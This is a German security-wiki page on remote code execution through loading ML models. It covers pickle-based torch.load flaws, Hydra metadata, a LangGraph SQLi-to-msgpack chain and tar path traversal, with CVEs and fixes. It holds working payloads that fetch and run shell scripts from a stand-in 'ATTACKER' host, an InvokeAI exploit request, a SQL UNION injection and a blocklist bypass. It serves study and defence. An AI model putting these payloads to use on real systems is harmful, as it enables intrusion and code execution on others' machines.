# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laden, um RCE zu erzielen

Machine-Learning-Modelle werden üblicherweise in verschiedenen Formaten wie ONNX, TensorFlow, PyTorch usw. weitergegeben. Entwickler oder Produktionssysteme können diese Modelle laden und verwenden. Normalerweise sollten die Modelle keinen bösartigen Code enthalten, aber in manchen Fällen kann ein Modell dazu verwendet werden, beliebigen Code auf dem System auszuführen – entweder als beabsichtigte Funktion oder aufgrund einer Schwachstelle in der Bibliothek zum Laden des Modells.

Die folgende Tabelle listet repräsentative Schwachstellen dieser Kategorie auf:

| **Framework / Tool**        | **Schwachstelle (falls verfügbar: CVE)**                                                    | **RCE-Vektor**                                                                                                                           | **Referenzen**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Bösartiges pickle im Model-Checkpoint führt zur Codeausführung (umgeht die `weights_only`-Schutzmaßnahme)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + bösartiger Model-Download führt zur Codeausführung; Java-Deserialisierungs-RCE in der Management-API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsichere Deserialisierung von Checkpoints über `torch.load` **(CVE-2025-23298)**                                           | Ein nicht vertrauenswürdiger Checkpoint löst während `load_model_trainer_states_from_checkpoint` einen pickle-Reducer aus → Codeausführung im ML-Worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis-Checkpointer) | SQLi + unsicherer MessagePack-Erweiterungshook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Ein benutzerkontrollierter `filter`-Schlüssel schleust SQL-/JSON-Path-Syntax ein, `UNION SELECT` fälscht eine Checkpoint-Zeile, dann importiert und ruft die `msgpack`-Deserialisierung vom Angreifer ausgewählten Python-Code auf | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Beim Laden eines Modells aus YAML wird `yaml.unsafe_load` verwendet (Codeausführung) <br> Beim Laden eines Modells mit einer **Lambda**-Ebene wird beliebiger Python-Code ausgeführt          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Ein präpariertes `.tflite`-Modell löst einen Integer Overflow aus → Heap Corruption (potenzielle RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Beim Laden eines Modells über `joblib.load` wird pickle mit der `__reduce__`-Payload des Angreifers ausgeführt                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                              | `numpy.load` erlaubte standardmäßig gepickelte Objekt-Arrays – eine bösartige `.npy/.npz`-Datei löst Codeausführung aus                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (Directory Traversal) <br> **CVE-2024-5187** (Tar Traversal)                                                    | Der Pfad zu den externen Gewichten eines ONNX-Modells kann das Verzeichnis verlassen (beliebige Dateien lesen) <br> Ein bösartiges ONNX-Model-Tar-Archiv kann beliebige Dateien überschreiben (was zu RCE führt) | |
| ONNX Runtime (Designrisiko)  | *(Keine CVE)* Benutzerdefinierte ONNX-Ops / Kontrollfluss                                                                                    | Ein Modell mit einem benutzerdefinierten Operator erfordert das Laden nativen Codes des Angreifers; komplexe Modellgraphen missbrauchen die Logik, um unbeabsichtigte Berechnungen auszuführen   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (Path Traversal)                                                                                          | Wenn die Model-Load-API mit aktiviertem `--model-control` verwendet wird, ermöglicht ein relativer Path Traversal das Schreiben von Dateien (z. B. das Überschreiben von `.bashrc` für RCE)    | |
| **GGML (GGUF-Format)**      | **CVE-2024-25664 … 25668** (mehrere Heap Overflows)                                                                         | Eine fehlerhaft formatierte GGUF-Modelldatei verursacht Heap Buffer Overflows im Parser und ermöglicht die Ausführung beliebigen Codes auf dem System des Opfers                     | |
| **Keras (ältere Formate)**   | *(Keine neue CVE)* Veraltetes Keras-H5-Modell                                                                                         | Code in der Lambda-Ebene eines bösartigen HDF5-Modells (`.h5`) wird beim Laden weiterhin ausgeführt (Keras `safe_mode` deckt das alte Format nicht ab – „Downgrade-Angriff“) | |
| **Andere** (allgemein)        | *Designfehler* – Pickle-Serialisierung                                                                                         | Viele ML-Tools (z. B. pickle-basierte Modellformate, Python `pickle.load`) führen beliebigen Code aus, der in Modelldateien eingebettet ist, sofern keine Schutzmaßnahmen getroffen werden | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Nicht vertrauenswürdige Metadaten werden an `hydra.utils.instantiate()` übergeben **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Vom Angreifer kontrollierte Modellmetadaten/-konfiguration setzen `_target_` auf einen beliebigen aufrufbaren Wert (z. B. `builtins.exec`) → wird während des Ladens ausgeführt, selbst bei „sicheren“ Formaten (`.safetensors`, `.nemo`, Repo-`config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Außerdem gibt es einige Python-Pickle-basierte Modelle, etwa die von [PyTorch](https://github.com/pytorch/pytorch/security) verwendeten, mit denen beliebiger Code auf dem System ausgeführt werden kann, wenn sie nicht mit `weights_only=True` geladen werden. Daher sind alle pickle-basierten Modelle möglicherweise besonders anfällig für diese Art von Angriffen, selbst wenn sie in der obigen Tabelle nicht aufgeführt sind.

### Hydra-Metadaten → RCE (funktioniert auch mit safetensors)

`hydra.utils.instantiate()` importiert und ruft jedes gepunktete `_target_` in einem Konfigurations-/Metadatenobjekt auf. Wenn Bibliotheken wie Hugging Face Transformers nicht vertrauenswürdige **Modellmetadaten** an `instantiate()` übergeben, kann ein Angreifer einen aufrufbaren Wert und Argumente angeben, die sofort während des Modellladens ausgeführt werden (kein pickle erforderlich).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Beispiel-Payload (funktioniert in `model_config.yaml` von `.nemo`, in der Repo-`config.json` oder in `__metadata__` innerhalb von `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Wichtige Punkte:
- Wird vor der Modellinitialisierung in NeMo `restore_from/from_pretrained`, uni2TS-HuggingFace-coders und FlexTok-loaders ausgelöst.
- Hydras String-Blocklist lässt sich über alternative Importpfade (z. B. `enum.bltns.eval`) oder von der Anwendung aufgelöste Namen (z. B. `nemo.core.classes.common.os.system` → `posix`) umgehen.<sup>[[14]](#references)</sup>
- FlexTok parst außerdem stringifizierte Metadaten mit `ast.literal_eval`, was vor dem Hydra-Aufruf einen DoS (CPU-/Speicherüberlastung) ermöglicht.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfläche für Stable-Diffusion. Die Versionen **5.3.1 – 5.4.2** stellen den REST-Endpunkt `/api/v2/models/install` bereit, über den Benutzer Modelle von beliebigen URLs herunterladen und laden können.<sup>[[1]](#references)</sup>

Intern ruft der Endpunkt schließlich Folgendes auf:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Wenn es sich bei der bereitgestellten Datei um einen **PyTorch-Checkpoint (`*.ckpt`)** handelt, führt `torch.load` eine **Pickle-Deserialisierung** durch. Da der Inhalt direkt von der vom Benutzer kontrollierten URL stammt, kann ein Angreifer ein bösartiges Objekt mit einer eigenen `__reduce__`-Methode in den Checkpoint einbetten. Diese Methode wird **während der Deserialisierung** ausgeführt und führt dadurch zu **Remote Code Execution (RCE)** auf dem InvokeAI-Server.

Die Schwachstelle erhielt die Kennung **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploit-Ablauf

1. Erstellen Sie einen bösartigen Checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Hosten Sie `payload.ckpt` auf einem HTTP-Server, den Sie kontrollieren (z. B. `http://ATTACKER/payload.ckpt`).
3. Lösen Sie den anfälligen Endpoint aus (keine Authentifizierung erforderlich):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Wenn InvokeAI die Datei herunterlädt, ruft es `torch.load()` auf → das `os.system`-Gadget wird ausgeführt und der Angreifer erlangt Codeausführung im Kontext des InvokeAI-Prozesses.

Fertiges Exploit: Das **Metasploit**-Modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.<sup>[[3]](#references)</sup>

#### Voraussetzungen

•  InvokeAI 5.3.1-5.4.2 (Scan-Flag standardmäßig **false**)
•  `/api/v2/models/install` ist für den Angreifer erreichbar
•  Der Prozess verfügt über Berechtigungen zum Ausführen von Shell-Befehlen

#### Gegenmaßnahmen

* Auf **InvokeAI ≥ 5.4.3** aktualisieren – der Patch setzt `scan=True` als Standard und führt vor der Deserialisierung einen Malware-Scan durch.<sup>[[2]](#references)</sup>
* Beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` oder den neuen Helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) verwenden.
* Zulassungslisten / Signaturen für Modellquellen durchsetzen und den Dienst mit minimalen Berechtigungen ausführen.

> ⚠️ Denk daran, dass jedes auf Python-Pickle basierende Format (einschließlich vieler `.pt`-, `.pkl`-, `.ckpt`- und `.pth`-Dateien) grundsätzlich unsicher ist, wenn es aus nicht vertrauenswürdigen Quellen deserialisiert wird.

---

Beispiel für eine Ad-hoc-Gegenmaßnahme, wenn ältere InvokeAI-Versionen hinter einem Reverse Proxy weiterlaufen müssen:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE über unsicheres `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (Teil von Merlin) stellte einen unsicheren Checkpoint-Loader bereit, der direkt `torch.load()` auf vom Benutzer bereitgestellten Pfaden aufrief. Da `torch.load` auf Python `pickle` basiert, kann ein vom Angreifer kontrollierter Checkpoint während der Deserialisierung über einen Reducer beliebigen Code ausführen.<sup>[[5]](#references)</sup>

Verwundbarer Pfad (vor dem Fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Warum dies zu RCE führt: In Python pickle kann ein Objekt einen Reducer (`__reduce__`/`__setstate__`) definieren, der ein aufrufbares Objekt und Argumente zurückgibt. Das aufrufbare Objekt wird während des Unpicklings ausgeführt. Ist ein solches Objekt in einem Checkpoint enthalten, wird es ausgeführt, bevor irgendwelche Gewichte verwendet werden.

Minimales Beispiel für einen bösartigen Checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Auslieferungsvektoren und Schadensradius:
- Trojanisierte Checkpoints/Modelle, die über Repos, Buckets oder Artifact Registries geteilt werden
- Automatisierte Resume-/Deploy-Pipelines, die Checkpoints automatisch laden
- Die Ausführung erfolgt innerhalb von Training-/Inference-Workern, oft mit erhöhten Berechtigungen (z. B. als root in Containern)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte den direkten Aufruf von `torch.load()` durch einen eingeschränkten Deserializer mit Allowlist, implementiert in `transformers4rec/utils/serialization.py`. Der neue Loader validiert Typen/Felder und verhindert, dass während des Ladens beliebige Callables aufgerufen werden.<sup>[[7]](#references)</sup>

Spezielle Sicherheitshinweise zu PyTorch-Checkpoints:
- Untrusted Daten nicht deserialisieren. Wenn möglich, nicht ausführbare Formate wie [Safetensors](https://huggingface.co/docs/safetensors/index) oder ONNX bevorzugen.
- Wenn PyTorch-Serialization verwendet werden muss, sicherstellen, dass `weights_only=True` gesetzt ist (in neueren PyTorch-Versionen unterstützt), oder einen benutzerdefinierten Unpickler mit Allowlist verwenden, ähnlich dem Transformers4Rec-Patch.<sup>[[4]](#references)</sup>
- Model-Provenienz/Signaturen erzwingen und die Deserialisierung in einer Sandbox ausführen (seccomp/AppArmor; Nicht-root-Benutzer; eingeschränktes FS und kein ausgehender Netzwerkverkehr).
- Unerwartete Child-Prozesse von ML-Services zum Zeitpunkt des Ladens von Checkpoints überwachen; die Verwendung von `torch.load()`/`pickle` nachverfolgen.

POC- und Verweise auf verwundbare Versionen/Patches:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Verwundbarer Loader vor dem Patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC für einen schädlichen Checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader nach dem Patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Beispiel – Erstellen eines schädlichen PyTorch-Modells

- Modell erstellen:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Modell laden:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD stellt einen `resnet`-Endpoint bereit, der benutzergesteuerte Daten deserialisiert. ZDI bestätigte, dass ein Remote-Angreifer ein Opfer dazu bringen kann, eine bösartige Seite/Datei zu laden, diese einen manipulierten serialisierten Blob an diesen Endpoint senden und die Deserialisierung als `root` auslösen zu lassen, was zur vollständigen Kompromittierung führt.

Der Exploit-Ablauf entspricht dem typischen pickle-Missbrauch:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Jedes Gadget, das während der Deserialisierung erreichbar ist (Konstruktoren, `__setstate__`, Framework-Callbacks usw.), kann auf dieselbe Weise weaponized werden – unabhängig davon, ob der Transport HTTP, WebSocket oder eine Datei war, die in einem überwachten Verzeichnis abgelegt wurde.



### LangGraph checkpointer SQLi → MessagePack RCE

Diese Angriffskette ist interessant, weil der Angreifer **keine schädliche Modelldatei hochladen muss**. Stattdessen stellt die Anwendung eine **Persistence-API für AI-Agenten** (`get_state_history(..., filter=...)`) bereit, und Benutzereingaben erreichen den Query Builder des Checkpointers.

#### 1. Strukturelle SQLi in Metadatenfiltern

Ein anfälliges SQLite-Muster sah so aus:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Der Wert wird später gebunden, aber `query_key` wird in den **JSON-Pfad-String** eingefügt. Ein `'` im Dictionary-Schlüssel bricht daher aus `'$.{query_key}'` aus und injiziert SQL. Dieselbe Lektion gilt für **JSON-Pfade, Bezeichner, Operatoren, `LIMIT`- und TTL-Felder**: Platzhalter schützen nur Werte, nicht die strukturelle Abfragesyntax.

#### 2. `UNION SELECT` kann nachgelagerte Senken anvisieren, nicht nur Daten stehlen

Die Abfrage gibt `type` und serialisierte `checkpoint`-Bytes zurück, die später wie folgt verarbeitet werden:

```python
self.serde.loads_typed((type, checkpoint))
```

Das bedeutet, dass eine SQLi in der `WHERE`-Klausel eine **gefälschte Ergebniszeile** einschleusen kann:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Wenn späterer Code ausgewählte Spalten parst, deserialisiert, schreibt oder ausführt, ordne diese Spalten ihren Sinks zu. In diesem Fall macht die gefälschte Zeile aus SQLi eine **vom Angreifer kontrollierte Deserialisierung**.

#### 3. Unsichere MessagePack-Extension-Hooks entsprechen Code-Gadgets

Der `msgpack`-Pfad von LangGraph verwendete einen benutzerdefinierten Extension-Hook, der ein verschachteltes Tupel entpackte und Folgendes ausführte:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Ein MessagePack-Erweiterungsobjekt, das etwas Entsprechendes zu `("os", "system", "id > /tmp/pwned")` kodiert, importiert also `os`, löst `system` auf und führt den Befehl aus. Prüfe bei AI-Frameworks **benutzerdefinierte MessagePack/JSON/pickle-Reviver** auf dynamische Imports, Reflection oder den Aufruf beliebiger Callables.

#### 4. Praktisches Audit-Muster für Agent-Frameworks

Prüfe alle benutzergesteuerten Eingaben, die Folgendes erreichen:
- APIs zum Auflisten von State-History / Memory / Replay / Checkpoints
- strukturierte Filter-Builder, die SQL- oder Redis-Query-Fragmente erzeugen
- benutzerdefinierte Deserialisierer (`pickle`, `msgpack`, `json`-Object-Hooks, YAML-Konstruktoren)
- Wiederherstellungspfade, die den vom Persistence-Layer zurückgegebenen Rows vertrauen

Diese spezifische Chain betraf selbst gehostete LangGraph-Deployments mit **SQLite**- oder **Redis**-Checkpointern, wenn nicht vertrauenswürdige Benutzer `filter` kontrollieren konnten. Die in der Offenlegung genannten gepatchten Versionen waren `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` und `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Modelle zu Path Traversal

Wie in [**diesem Blogbeitrag**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) kommentiert, basieren die meisten von verschiedenen AI-Frameworks verwendeten Modellformate auf Archiven, meist `.zip`. Daher könnten diese Formate möglicherweise für Path Traversal-Angriffe missbraucht werden, um beliebige Dateien auf dem System auszulesen, auf dem das Modell geladen wird.<sup>[[16]](#references)</sup>

Zum Beispiel kannst du mit dem folgenden Code ein Modell erstellen, das beim Laden eine Datei im Verzeichnis `/tmp` erstellt:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Oder mit dem folgenden Code kannst du ein Modell erstellen, das beim Laden einen Symlink auf das Verzeichnis `/tmp` erstellt:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Tiefgehende Analyse: Keras-.keras-Deserialisierung und Gadget-Jagd

Einen gezielten Leitfaden zu den Interna von .keras, RCE über Lambda-Layer, dem Problem mit beliebigen Imports in ≤ 3.8 und der Gadget-Suche innerhalb der Allowlist nach dem Fix findest du hier:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec-Blog – „CVE-2024-12029 – Deserialisierung nicht vertrauenswürdiger Daten in InvokeAI“](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI-Patch-Commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentation zum Rapid7-Metasploit-Modul](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – Sicherheitshinweise zu torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI-Blog – CVE-2025-23298: Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI-Sicherheitshinweis: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec-Patch-Commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Verwundbarer Loader vor dem Patch (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC für einen bösartigen Checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader nach dem Patch (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution mit modernen KI/ML-Formaten und Bibliotheken](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra-Dokumentation zu instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra-Commit zur Blocklist (Warnung vor RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Von SQLi zu RCE: Ausnutzung von LangGraphs Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive-Slip-Bugs für hochwertige KI/ML-Bounties nutzbar machen](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
